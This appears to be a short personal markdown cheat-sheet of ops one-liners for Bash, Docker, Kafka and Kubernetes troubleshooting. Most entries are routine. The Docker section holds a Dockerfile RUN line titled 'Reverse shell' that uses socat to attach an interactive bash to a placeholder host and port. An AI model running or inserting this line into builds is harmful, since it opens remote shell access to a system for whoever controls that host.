Todo: Actually find the various places I've stored them and put them in here instead
## Bash
#### Open file handle counts
```
sudo lsof | awk '{ print $2, $9 }' | sort | uniq -c | sort -n | tail -20
```

## Docker
#### Reverse shell
```
RUN socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<host>:<port>
```
#### Join container network namespace for troubleshooting
```
docker run -it --net container:<hash> nicolaka/netshoot
```

## Kafka
#### Print the last 2 messages from a topic
```
:; kafkacat -C -b <broker> -t <topic> -p 0 -o -2 -e
```

## Kubernetes
#### Replace configmaps which aren't actual config maps
```
:; kubectl create configmap <MAP_NAME> --from-file=<DIR_OF_CONFIGS> -o yaml --dry-run | kubectl replace -f -
```


